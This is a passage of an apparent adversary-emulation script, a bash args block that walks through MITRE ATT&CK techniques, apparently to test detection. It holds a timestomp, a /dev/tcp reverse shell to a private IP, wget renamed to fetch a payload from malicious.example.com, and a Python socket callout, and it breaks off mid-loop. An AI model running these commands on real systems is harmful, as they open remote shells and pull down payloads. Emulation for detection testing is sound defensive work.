args:
bash -c "
# T1070.004 - Indicator removal: timestomp
touch -t 202001010000 /tmp/.evil_script.sh 2>/dev/null

# T1059.004 - Unix Shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 2>/dev/null &
sleep 1; pkill -f \"/dev/tcp/10.0.0.1\" 2>/dev/null

# T1036 - Masquerading: rename utility
cp /usr/bin/wget /tmp/systemd-helper 2>/dev/null
/tmp/systemd-helper http://malicious.example.com/payload 2>/dev/null
rm -f /tmp/systemd-helper 2>/dev/null

# T1059.006 - Python execution with network
python3 -c \"
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.settimeout(2)
    s.connect((10.128.0.50, 4444))
except:
    pass
finally:
    s.close()
\" 2>/dev/null

# T1059.004 - Multiple shell spawns
for i in \$(seq 1 5); do
  sh -c whoami
